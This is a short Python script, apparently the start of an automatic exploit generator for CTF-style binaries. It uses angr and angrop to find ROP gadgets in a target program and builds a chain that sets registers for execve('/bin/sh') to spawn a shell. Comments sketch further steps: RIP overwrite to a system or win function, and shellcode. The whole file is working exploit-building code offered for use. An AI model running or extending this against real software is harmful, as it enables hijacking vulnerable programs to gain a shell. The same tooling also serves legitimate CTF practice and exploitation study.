from pwn import *
import angr, angrop
import claripy

# [+] check for mitigations in binary and then divide 
# RIP overwrite if system or win exist in the code
# ROPchain to call execve
# shellcode to direct to

name = sys.argv[1]
proj = angr.Project(name,auto_load_libs=False)
state = proj.factory.entry_state(stdin=angr.SimFile)
 
def find_rop():
	flag = 0
	try:
		rop = proj.analyses.ROP()
		rop.find_gadgets()
		chain = rop.set_regs(rax=0x3b,rdi="/bin/sh\x00",rdx=0,rsi=0)
		print(chain.print_payload_code())
	except angrop.errors.RopException:
		log.info("Could not construct ROPchain")
		flag = 1
	if(flag == 0):
		return chain
	else:
		return ""

find_rop()